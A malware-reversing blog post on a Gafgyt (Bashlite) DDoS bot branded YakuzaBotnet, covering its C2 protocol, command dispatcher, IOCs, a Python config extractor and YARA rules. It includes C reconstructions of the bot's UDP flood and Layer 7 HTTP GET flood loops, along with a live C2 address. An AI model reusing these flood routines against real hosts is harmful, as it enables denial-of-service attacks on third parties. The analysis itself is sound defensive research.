---
title: "A Gafgyt Variant Branded 'YakuzaBotnet': Walking Through an assailant.x86 ELF"
permalink: /blog/gafgyt-yakuzabotnet-assailant/
date: 2026-04-24 00:00:00 +0000
categories: [malware-reversing, threat-intel]
tags: [elf, ddos, gafgyt, bashlite, lizkebab, linux, botnet, yara, iot, scarface1337]
image:
  path: /assets/images/social/gafgyt-yakuzabotnet-card.png
description: "A reversing walkthrough of a Gafgyt variant uploaded as assailant.x86, branded YakuzaBotnet and operated by the handle Scarface1337. Covers C2 protocol, eight attack commands, the classic NeTiS banner heritage, and a Python config extractor."
---

## Introduction

Not every piece of malware tries to hide its ambition. Occasionally a sample lands on the analyst's desk that wears its intentions like a badge. This ELF binary, a statically linked uClibc-compiled x86-64 DDoS bot, announces itself with three distinct branding strings stamped into its read-only data section: the operator handle `Scarface1337`, the bot brand `YakuzaBotnet`, and a banner lifted nearly verbatim from the 2015-era Bashlite source leak, `Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS`.

That last string is the tell. It places this binary firmly inside the Gafgyt lineage, where it has sat since adliwahid uploaded it to MalwareBazaar as `assailant.x86`. What follows is a walkthrough of how this 92 KB bot daemonizes itself, speaks to its lone C2 server, and exposes eight operator commands covering roughly five distinct attack techniques, from UDP flood to Layer 7 HTTP flood with user-agent rotation. The sample carries no scanner and no credential brute-force module, an architectural choice that separates this variant from the Mirai branch of the Gafgyt family tree.

---

## Sample Properties

| Property | Value |
|---|---|
| **Filename on MalwareBazaar** | `assailant.x86` |
| **SHA-256** | `a105a6a8a5f3b949b8268ab62c6f90f42bb4d00608f6b786f9bf82eba391ab32` |
| **SHA-1** | `ab575608d6d6d67fa2efb2d20d602b717ec02856` |
| **MD5** | `5de21bec814d435f3938f3f1614e9466` |
| **ssdeep** | `1536:W7WREyqkQc923v2uNi7pNF+BoD3Ophanvn00/FmoI5um2Xj5YZA0e:4RkQT3v9EbYBo7Ophanvn00dmr5um2Xx` |
| **File size** | 92,932 bytes |
| **Format** | ELF 64-bit LSB executable, x86-64 |
| **Linkage** | Statically linked (uClibc) |
| **Stripped** | No |
| **Compiler** | GCC 4.1.2 |
| **OS ABI** | SYSV |
| **Entropy (.text)** | 6.283 |
| **Family** | Gafgyt (aka Bashlite, Lizkebab, Torlus, LizardStresser) |
| **Variant branding** | YakuzaBotnet |
| **Operator handle** | Scarface1337 |
| **C2** | `192.109.200.254:1111` (TCP, plaintext) |
| **MITRE tactics** | Discovery, Command and Control, Impact |

---

## Family Lineage

The canonical Gafgyt source code, also known as Bashlite, was leaked publicly on Hack Forums in the 2014-2015 window. Dozens of forks followed, collectively tracked under names like Lizkebab, Torlus, and LizardStresser, and parts of its IoT targeting approach later informed the Mirai codebase. This sample is a direct Gafgyt derivative rather than a novel family. Three fingerprints anchor the attribution:

1. **The NeTiS banner.** The exact string `Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS` is a recognized Gafgyt marker. Elastic Security publishes a byte-signature rule (`Linux_Trojan_Gafgyt_eaa9a668`) that matches on the ASCII prefix of this banner, and it has accompanied Gafgyt variants for nearly a decade.

2. **The flood-adjacent filler bytes.** Large stretches of `.rodata` are populated by the literal ASCII sequence `/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A` repeated for thousands of bytes. This is not encoded data and not a decoding key. It is a filler block that survives in the Gafgyt source tree and gets compiled into almost every fork, looking syntactically like escape-hex without actually being hex. Elastic rule `Linux_Trojan_Gafgyt_28a2fe0c` matches exactly this byte pattern across Gafgyt families.

3. **Command naming.** The `UDPRAW`, `OVH`, `GAME`, `RANDHEX`, `STOP`, and `PGET` command tokens are inherited from the leaked Gafgyt bot.c dispatcher. The compiler even preserved the original source file names `bot.c` and `kill.c` in the unstripped symbol table, a direct echo of the leaked tree layout.

This is a reskinned Gafgyt, not a new family. What makes it worth studying is the lack of a propagation module (no Telnet scanner, no SSH brute-force, no Mirai-style credential list) and the Layer 7 refinements in `ovhl7`.

---

## Actor Attribution

The binary contains two operator-facing strings back to back in `.rodata`:

```
Scarface1337
YakuzaBotnet
```

The first is the operator handle, `Scarface1337`, a common skid-era alias format. The second is the bot brand that appears directly adjacent to it in the rodata banner, stitched into the `Self Rep Fucking NeTiS...` string. Attribution at this level should be treated as performative rather than reliable, since both strings can be edited in a builder, but the pairing with the NeTiS banner narrows the likely source tree: a Gafgyt fork that a Scarface1337-branded group built, branded YakuzaBotnet, and distributed as `assailant.x86`.

---

## Kill Chain

![YakuzaBotnet Kill Chain](/assets/images/posts/gafgyt-yakuzabotnet/killchain.png)

On execution the bot:

1. Seeds both libc `rand()` (via `srand`) and the bot's in-tree Complementary Multiply-With-Carry generator (via `init_rand`). Main calls `time()` and `getpid()` twice, feeding the results into each seeder.
2. Performs a classic Unix double-fork, calls `setsid()` and `chdir()` to fully detach from the controlling terminal.
3. Enumerates the local IPv4 address by reading `/proc/net/route`.
4. Opens a TCP connection to the C2 at `192.109.200.254:1111` via the `connectTimeout` wrapper. The binary references a `coServer` table accessed by index, but only a single server string is observed in this sample.
5. Sends the registration banner, enters the `recvLine` loop, and dispatches each received line through `processCmd`.

---

## C2 Protocol

![C2 Registration and Command Dispatch](/assets/images/posts/gafgyt-yakuzabotnet/c2_protocol.png)

`initConnection()` at `0x004032cc` parses the hardcoded server string `192.109.200.254:1111` by splitting on the colon, then opens a `SOCK_STREAM` socket and calls `connectTimeout()`. Once connected, the bot emits its banner through `sockprintf()`:

```c
sockprintf(mainCommSock, "%s \e[1;31mip:%s", getArch(), ourIP);
```

The escape sequence `\e[1;31m` renders the IP in red in ANSI-capable terminals. That cosmetic detail reveals the C2 UI: the operator sees connected bots in a terminal-based panel, not a web dashboard. After the banner the bot enters an indefinite read loop.

### Infrastructure

The C2 endpoint lives inside a single /24 that maps to a well-known bulletproof-tolerant hosting chain:

| Attribute | Value |
|---|---|
| Netblock | `192.109.200.0/24` (entire /24 sub-allocated to the same tenant) |
| ASN | `AS51396 PFCLOUD` |
| Upstream LIR | Pfcloud UG (haftungsbeschränkt), Thyrnau, Germany |
| Sub-allocation maintainer | `lir-bg-telco-1-MNT` (Bulgarian startup LIR) |
| Sub-allocation created | 2025-04-09 |
| Route object (BGP announcement) | 2026-01-18, roughly three months before the sample surfaced on MalwareBazaar |
| Reverse DNS | `eatablenorth.ptr.network` (nonsense PTR scheme shared across the block) |
| Abuse contact | `abuse@pfcloud.io` |

The chain of RIPE assignment into a small German LIR that then re-delegates into a Bulgarian startup maintainer is a pattern commonly associated with abuse-tolerant hosting. The PTR on the C2 host itself is a low-information, template-looking name on the `ptr.network` tree, worth pivoting on if neighboring addresses in the /24 show the same shape. For perimeter blocking, the right unit of work is the /24, not the single host.

Probing the C2 endpoint from a researcher vantage returns connection timeouts across every common port including 22, 80, 443, 1111, 2222, and 6667. Either the host geo-filters non-bot traffic or the operator has already migrated. Either way, the durable IOC is the attribution chain (ASN, maintainer, advertisement date), not the single IP.

---

## Command Dispatcher

`processCmd()` at `0x00402730` uses an `strtok`-split command array and dispatches each keyword through a chain of `repe cmpsb` comparisons. Radare2 shows the pattern clearly for the first token, `XTD`:

```text
0x0040275c      mov qword [var_e0h], 0x40da87    ; rodata pointer to "XTD"
0x00402767      mov qword [var_e8h], 4           ; compare length = 4 bytes
0x00402772      cld
0x00402773      mov rsi, qword [var_d8h]         ; received command
0x0040277a      mov rdi, qword [var_e0h]         ; constant "XTD\0"
0x00402781      mov rcx, qword [var_e8h]
0x00402788      repe cmpsb byte [rsi], byte [rdi]
0x0040278a      seta dl
0x0040278d      setb al
0x00402790      sub cl, al
0x00402799      test eax, eax
0x0040279b      jne 0x4028ee                     ; not XTD, try next command
```

This structure repeats for each of the eight recognized commands:

| Command | Handler | Purpose |
|---|---|---|
| `UDPRAW` | `sym.UDPRAW` @ `0x00401783` | UDP packet flood, 256-byte handler |
| `OVH` | `sym.ovhl7` @ `0x00401a08` | HTTP Layer 7 GET flood with UA rotation |
| `XTD` | `sym.xtdcustom` @ `0x00401683` | Custom configurable flood, forks via listFork |
| `GAME` | internal | UDP-based game-server packet flood |
| `PGET` | internal | HTTP GET variant, prefix-marked |
| `RANDHEX` | `sym.Randhex` @ `0x00401883` | Returns a random hex string to the operator |
| `STOP` | `kill()` on obj.pids | SIGKILL every tracked attack child |
| `stop` | `kill()` on obj.pids | Lowercase alias of STOP |

Target IP, port, and duration are positional `strtok`-parsed arguments after the command keyword.

---

## Attack Methods

### SendSTD: UDP Flood

`SendSTD()` at `0x00401501` is the workhorse of the UDP-flood family. Correcting a first-pass reading that called it a raw-socket SYN flood, the actual system call is:

```text
0x0040151f      mov edx, 0          ; protocol = 0
0x00401524      mov esi, 2          ; type = SOCK_DGRAM
0x00401529      mov edi, 2          ; domain = AF_INET
0x0040152e      call sym.socket     ; returns a UDP socket
```

`domain = 2, type = 2, protocol = 0` is a garden-variety `AF_INET / SOCK_DGRAM` UDP socket. No raw privileges are required. The bot then resolves the target via `gethostbyname` and populates a `sockaddr_in`. Inside the flood loop a small buffer is filled using the two template constants `0xCECECE` and `0xECECEC` combined with libc `rand()` calls, then sent to the target. The pattern below is a reading of the asm, not a literal source dump:

```c
int fd = socket(AF_INET, SOCK_DGRAM, 0);
struct hostent *he = gethostbyname(target);
struct sockaddr_in sa = { .sin_family = AF_INET };
memcpy(&sa.sin_addr, he->h_addr_list[0], he->h_length);
sa.sin_port = htons(port);
time_t end = time(NULL) + duration;
uint32_t t1 = 0xCECECE, t2 = 0xECECEC;
while (time(NULL) < end) {
    // mix rand() against the two template constants, pack into buf
    memcpy(buf, &t1, sizeof(t1));
    memcpy(buf + 4, &t2, sizeof(t2));
    buf[rand() % sizeof(buf)] ^= (rand() & 0xFF);
    send(fd, buf, sizeof(buf), 0);
    connect(fd, (struct sockaddr *)&sa, sizeof(sa));
}
close(fd);
_exit(0);
```

Note that `SendSTD` seeds its randomness from libc `rand()`, not from the CMWC generator discussed below. The CMWC generator is used elsewhere in the binary, specifically by `getRandomIP`.

### OVH L7 HTTP Flood: `ovhl7`

The most sophisticated vector targets Layer 7. For each iteration, `ovhl7` picks a random User-Agent from a 59-entry array and constructs an HTTP/1.1 GET request.

```c
int ua_idx = rand() % NUM_USER_AGENTS;
sprintf(request,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, user_agents[ua_idx]);
if (fork() == 0) {
    int fd = socket_connect(host, port);
    write(fd, request, strlen(request));
    char buf[4096];
    read(fd, buf, sizeof(buf));
    close(fd);
    exit(0);
}
```

The name `ovhl7` is typical of Gafgyt forks, where `OVH` as a command token appears in multiple public leaks. OVH runs widely-used anti-DDoS infrastructure, and the method is tuned to exhaust per-connection request-rate limits rather than raw bandwidth. The 59-entry UA array is a grab-bag of browser and crawler signatures, including:

```
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 ... Chrome/65.0.3325.181 ...
FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)
TheSuBot/0.2 (www.thesubot.de)
BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)
zspider/0.9-dev http://feedback.redkolibri.com/
Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 ... NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US
Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 ... Safari/7046A194A
```

The `zspider`, `TheSuBot`, `BillyBobBot`, and `FAST-WebCrawler` entries pre-date 2015 and appear in nearly every Gafgyt fork since. Their survival in modern variants suggests nobody has bothered to refresh the list in a decade.

### UDPRAW and xtdcustom

`UDPRAW` at `0x00401783` is a compact 256-byte handler that emits UDP datagrams in a tight send loop. The specific per-packet payload shape is compiled in but I have not traced every byte; the relevant defensive fact is that it is a UDP datagram flood, not a raw-socket IP-header flood. `xtdcustom` at `0x00401683` is a configurable flood that spawns a worker pool via `listFork`, where the operator tunes concurrency through additional command arguments.

### PRNG: Complementary Multiply-With-Carry

The bot uses Marsaglia's CMWC4096 generator in `rand_cmwc` at `0x0040023d`. The state is laid out at fixed addresses in `.bss`:

| Symbol | Address | Role |
|---|---|---|
| `obj.Q` | `0x50fe80` | 4096-entry 32-bit Q-array |
| `obj.c` | `0x50f97c` | carry, initialized to `0x587c4` |
| `obj.i` | `0x50f980` | index, masked with `0xfff` |

The core update is:

```text
0x00400242      mov qword [var_18h], 0x495e          ; a = 18782
0x0040024a      mov dword [var_ch],  0xfffffffe      ; m-1 = 2^32 - 2
0x00400251      mov  eax, dword [obj.i]
0x00400257      inc  eax
0x00400259      and  eax, 0xfff                       ; i = (i+1) mod 4096
0x0040025e      mov  dword [obj.i], eax
0x00400264      mov  eax, dword [obj.i]
0x0040026c      mov  eax, dword [rax*4 + obj.Q]      ; x = Q[i]
0x00400275      mov  rdx, rax
0x00400278      imul rdx, qword [var_18h]            ; t = a * x
0x0040027d      mov  eax, dword [obj.c]
0x00400285      lea  rax, [rdx + rax]                ; t += c
0x00400291      shr  rax, 0x20                       ; c = t >> 32
0x004002a1      mov  eax, dword [obj.c]
0x004002a7      lea  eax, [rdx + rax]                ; x = t + c
0x004002d7      sub  ebx, edx                        ; Q[i] = (m-1) - x
0x004002dd      mov  dword [rax*4 + obj.Q], edx
```

Multiplier `0x495e` (18782) paired with a 4096-entry Q-array matches the CMWC4096 parameter set commonly attributed to Marsaglia, with a published period on the order of 2^131086, vastly longer than libc `rand()`. In this binary the CMWC output feeds `getRandomIP`, where a long-period generator helps if the bot is ever asked to iterate a large random IP space without obvious aliasing. It does not feed the SendSTD UDP flood payload, which uses libc `rand()` directly.

---

## What Is Not Here: No Propagation

Gafgyt forks typically include a scanner, for Telnet brute-force (`SCANNER ON | OFF`) or SSH credential stuffing. This sample has none. No embedded credential list, no `KILLSUB` competitor-killer, no UPnP or CVE exploit module, no `TFTP` or `wget` downloader. The bot does exactly one thing: wait for commands and flood. That narrow scope means `YakuzaBotnet` assumes it will be delivered by an external dropper or loader, and the operator is relying on a separate infection toolchain to populate the botnet.

---

## Python Config Extractor

Because the C2 endpoint, branding, commands, and user-agent table sit in plaintext, a small static extractor can recover the full operator config without running the binary. The script below produces a JSON blob suitable for threat-intel ingestion.

```python
#!/usr/bin/env python3
"""Gafgyt (YakuzaBotnet / assailant) config extractor."""
import json, re, sys
from pathlib import Path

C2_RE = re.compile(rb"\b((?:\d{1,3}\.){3}\d{1,3}):(\d{1,5})\b")
CMD_KEYWORDS = {b"UDPRAW", b"OVH", b"XTD", b"GAME",
                b"RANDHEX", b"STOP", b"stop", b"PGET"}
GAFGYT_BANNERS = [b"Self Rep Fucking NeTiS", b"L33T HaxErS",
                  b"Thisity 0n Ur FuCkInG FoReHeAd"]
ACTOR_RE = re.compile(rb"\b(Scarface\d{2,4}|YakuzaBotnet)\b")


def ascii_strings(data, min_len=4):
    out, cur = [], bytearray()
    for b in data:
        if 32 <= b < 127:
            cur.append(b)
        else:
            if len(cur) >= min_len:
                out.append(bytes(cur))
            cur.clear()
    if len(cur) >= min_len:
        out.append(bytes(cur))
    return out


def extract(path):
    data = path.read_bytes()
    strings = ascii_strings(data)
    c2 = []
    for m in C2_RE.finditer(data):
        ip, port = m.group(1).decode(), int(m.group(2))
        if int(ip.split(".")[0]) in (1, 2, 3, 4) and port < 100:
            continue
        c2.append(f"{ip}:{port}")
    uas = [s.decode(errors="ignore") for s in strings
           if any(k in s for k in (b"Mozilla", b"Opera", b"Crawler",
                                    b"crawler", b"Bot/", b"Browser",
                                    b"Spider", b"spider"))
           and len(s) > 25 and b"\\" not in s]
    cmds = sorted({c.decode() for c in CMD_KEYWORDS if c in data})
    actors = sorted({m.group(1).decode() for m in ACTOR_RE.finditer(data)})
    banner = next((s.decode(errors="ignore") for s in strings
                   if b"Self Rep" in s and b"NeTiS" in s), None)
    return {
        "family": "Gafgyt",
        "variant_branding": "YakuzaBotnet",
        "sample_filename_observed": "assailant.x86",
        "c2_servers": sorted(set(c2)),
        "actor_signatures": actors,
        "operator_banner": banner,
        "attack_commands": cmds,
        "user_agent_count": len(uas),
    }


if __name__ == "__main__":
    print(json.dumps(extract(Path(sys.argv[1])), indent=2))
```

Running it against the sample yields:

```json
{
  "family": "Gafgyt",
  "variant_branding": "YakuzaBotnet",
  "sample_filename_observed": "assailant.x86",
  "c2_servers": ["192.109.200.254:1111"],
  "actor_signatures": ["Scarface1337", "YakuzaBotnet"],
  "operator_banner": "Scarface1337Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS",
  "attack_commands": ["GAME", "OVH", "PGET", "RANDHEX", "STOP", "UDPRAW", "XTD", "stop"],
  "user_agent_count": 59
}
```

For analysts ingesting Gafgyt at scale, filtering on the banner prefix alone yields a very high-precision cluster of related variants.

---

## Code Weaknesses

| Issue | Impact |
|---|---|
| `YakuzaBotnet`, `Scarface1337`, and the NeTiS banner are stored in plaintext | Trivial `strings` pivot; YARA-detectable at the second byte |
| Binary is not stripped | All 70-plus symbol names visible, reconstructing the source tree takes minutes |
| Single hardcoded C2 at `192.109.200.254:1111` | A takedown of one IPv4 kills the entire botnet, no DGA, no fallback list |
| No C2 traffic encryption | `tcpdump` over the C2 flow reveals every command in ASCII |
| No persistence mechanism | Bot dies on reboot, operator must re-seed |
| GCC 4.1.2 build, ELF type `ET_EXEC` (no PIE), no `__stack_chk_fail` references in the symbol table | Classic stack-based bugs would be unmitigated |
| No anti-debug, anti-VM, or sandbox checks | Runs transparently under `strace`, `ltrace`, any automated analysis box |
| No scanner, no propagation | Botnet population cannot grow without an external loader |

The absence of any anti-analysis code is notable. The author invested effort in eight attack vectors and a CMWC PRNG, but none in operational security.

---

## IOC Appendix

### Network (active infrastructure)

| Type | Value | Context |
|---|---|---|
| IP:Port | `192[.]109[.]200[.]254:1111` | C2 server, TCP, plaintext |
| CIDR | `192[.]109[.]200[.]0/24` | Recommended perimeter block unit, entire /24 is sub-allocated to the same tenant |
| ASN | `AS51396 PFCLOUD` | Announcing ASN, Pfcloud UG, DE |
| LIR chain | `lir-de-pfcloud-2-MNT` to `lir-bg-telco-1-MNT` | Rotational abuse pattern, sub-allocation 2025-04-09, BGP announcement 2026-01-18 |
| PTR (host) | `eatablenorth[.]ptr[.]network` | Low-information name on the `ptr.network` tree, worth checking for the same shape on neighboring addresses |
| Abuse contact | `abuse@pfcloud[.]io` | Upstream reporting channel |

### Domains embedded in User-Agent strings only (NOT infrastructure)

These three domains are artifacts of the Gafgyt source code's historical User-Agent rotation table. They fingerprint the family but none of them resolve to attacker-controlled infrastructure as of this analysis. Treat as string IOCs for family attribution, not as blockable network IOCs.

| Domain | DNS status | Note |
|---|---|---|
| `feedback[.]redkolibri[.]com` | NXDOMAIN, parent `redkolibri[.]com` not registered in `.com` | Home of the circa-2008 `zspider/0.9-dev` crawler, long dropped |
| `www[.]billybobbot[.]com` | NXDOMAIN, `billybobbot[.]com` not registered in `.com` | BillyBobBot/1.0 crawler landing page, dropped |
| `www[.]thesubot[.]de` | Zone delegated to `ns0*.hyrons[.]de` but returns SERVFAIL | TheSuBot/0.2 German crawler, abandoned zone |

### File

| Type | Value |
|---|---|
| SHA-256 | `a105a6a8a5f3b949b8268ab62c6f90f42bb4d00608f6b786f9bf82eba391ab32` |
| SHA-1 | `ab575608d6d6d67fa2efb2d20d602b717ec02856` |
| MD5 | `5de21bec814d435f3938f3f1614e9466` |
| ssdeep | `1536:W7WREyqkQc923v2uNi7pNF+BoD3Ophanvn00/FmoI5um2Xj5YZA0e:4RkQT3v9EbYBo7Ophanvn00dmr5um2Xx` |
| Filename (MalwareBazaar) | `assailant.x86` |

### Strings

| String | Use |
|---|---|
| `YakuzaBotnet` | Bot brand, C2 registration banner |
| `Scarface1337` | Operator handle, banner prefix |
| `Scarface1337Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS` | Full operator banner, Gafgyt-lineage marker |
| `zspider/0.9-dev http://feedback.redkolibri.com/` | UA in 59-entry flood rotation |
| `ovhl7`, `UDPRAW`, `xtdcustom` | Internal function names in symbol table |
| `bot.c`, `kill.c` | Source filenames preserved in unstripped ELF |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Evidence |
|---|---|---|---|
| T1016 | System Network Configuration Discovery | Discovery | Reads `/proc/net/route`, `/etc/resolv.conf` |
| T1033 | System Owner/User Discovery | Discovery | `getuid`, `geteuid`, `getgid` calls |
| T1082 | System Information Discovery | Discovery | Architecture fingerprinting in `getArch` |
| T1057 | Process Discovery | Discovery | `getpid`, child PID tracking in `obj.pids` |
| T1071.001 | Web Protocols | Command and Control | C2 registration banner and commands over TCP in ASCII |
| T1095 | Non-Application Layer Protocol | Command and Control | UDP floods bypass application-layer controls |
| T1036 | Masquerading | Defense Evasion | 59 spoofed User-Agent strings in HTTP flood traffic |
| T1498.001 | Direct Network Flood | Impact | UDP flood paths (`SendSTD`, `UDPRAW`, `GAME`) |
| T1499.002 | Service Exhaustion Flood | Impact | `ovhl7` L7 HTTP flood |
| T1499.003 | Application Exhaustion Flood | Impact | HTTP GET flood with UA rotation |

---

## YARA Rules

```text
import "elf"

rule Gafgyt_YakuzaBotnet_Branding {
    meta:
        description = "Detects the YakuzaBotnet Gafgyt variant by operator branding strings"
        author      = "Tao Goldi"
        date        = "2026-04-24"
        version     = 1
        sha256      = "a105a6a8a5f3b949b8268ab62c6f90f42bb4d00608f6b786f9bf82eba391ab32"
        reference   = "https://taogoldi.github.io/reverse-engineer/"

    strings:
        $brand      = "YakuzaBotnet"  ascii
        $actor      = "Scarface1337"  ascii
        $c2         = "192.109.200.254:1111" ascii
        $netis      = "Self Rep Fucking NeTiS" ascii
        $foreheads  = "0n Ur FuCkInG FoReHeAd" ascii
        $ua_zspider = "zspider/0.9-dev http://feedback.redkolibri.com/" ascii
        $func_ovhl7 = "ovhl7" ascii
        $src_bot_c  = "bot.c" ascii
        $src_kill_c = "kill.c" ascii

    condition:
        elf.type == elf.ET_EXEC
        and elf.machine == elf.EM_X86_64
        and filesize < 200KB
        and (
            ($brand and $c2)
            or ($actor and $netis)
            or 4 of them
        )
}

rule Gafgyt_NeTiS_Banner {
    meta:
        description = "Generic Gafgyt lineage detector via NeTiS operator banner"
        author      = "Tao Goldi"
        date        = "2026-04-24"
        version     = 1
        reference   = "https://taogoldi.github.io/reverse-engineer/"

    strings:
        $a = "Self Rep Fucking NeTiS and Thisity" ascii
        $b = "We BiG L33T HaxErS" ascii
        $c = "L33T HaxErS" ascii

    condition:
        elf.type == elf.ET_EXEC
        and filesize < 500KB
        and any of them
}

rule Gafgyt_OVHL7_UA_Rotation {
    meta:
        description = "Detects Gafgyt-lineage bots carrying the classic 59-entry UA rotation table"
        author      = "Tao Goldi"
        date        = "2026-04-24"
        version     = 1
        reference   = "https://taogoldi.github.io/reverse-engineer/"

    strings:
        $ua1 = "zspider/0.9-dev http://feedback.redkolibri.com/" ascii
        $ua2 = "TheSuBot/0.2 (www.thesubot.de)" ascii
        $ua3 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)" ascii
        $ua4 = "FAST-WebCrawler/3.6" ascii
        $ua5 = "FAST-WebCrawler/3.7" ascii

    condition:
        elf.type == elf.ET_EXEC
        and 3 of them
}
```

---

## Conclusion

YakuzaBotnet is a no-frills Gafgyt variant that trades operational security for attack power. Its eight-command dispatcher covers UDP flood, HTTP L7 flood with UA rotation, custom configurable packet shaping, and a game-server UDP vector, backed by a CMWC4096 generator for random IP selection and libc `rand()` for flood payload variation. Beneath the branding, the code lineage traces straight back to the 2014-2015 Bashlite leak, visible in the NeTiS banner, the `/x38/xFJ/` filler block, and the preserved `bot.c` and `kill.c` filenames.

For defenders, the operational takeaway is simple. Block the whole `192.109.200.0/24` at the perimeter rather than just the single host, because the entire /24 is sub-allocated to the same tenant through a rotational LIR chain and the next C2 will most likely sit one or two addresses over. Deploy the YARA rules above on any Linux host scanning workflow, since the NeTiS banner alone will catch dozens of related Gafgyt variants with a single signature. Network-layer detection is equally cheap because the C2 traffic is ASCII over plaintext TCP, with a distinctive `\e[1;31mip:` banner that jumps out in any Zeek or Suricata flow dump. The BGP route object for this /24 was advertised only three months before the sample surfaced, which fits the pattern of operators spinning up fresh netblocks through small European LIRs; treating the ASN and maintainer chain (`AS51396`, `lir-bg-telco-1-MNT`) as higher-order IOCs will generalize better than the single IP.

For the broader IoT and embedded Linux ecosystem, the dependency profile is the real lesson. GCC 4.1.2 plus uClibc plus `/etc/config/` path awareness points at a cross-compiled binary aimed at consumer routers and set-top boxes running buildroot-style firmware from a decade ago. Patching firmware, disabling exposed management interfaces, and blocking outbound traffic on non-standard ports remain the three controls that make this class of threat irrelevant.

The sample, the config JSON, YARA rules, and the Python extractor have been archived locally. Hashes and the C2 string are suitable for submission to community threat feeds.

---

## References

- Malpedia: `elf.gafgyt` [https://malpedia.caad.fkie.fraunhofer.de/details/elf.gafgyt](https://malpedia.caad.fkie.fraunhofer.de/details/elf.gafgyt)
- Elastic Security public Gafgyt YARA ruleset, including `Linux_Trojan_Gafgyt_eaa9a668` (NeTiS banner) and `Linux_Trojan_Gafgyt_28a2fe0c` (flood payload pattern)
- MITRE ATT&CK techniques referenced throughout: T1016, T1033, T1036, T1057, T1071.001, T1082, T1095, T1498.001, T1499.002, T1499.003
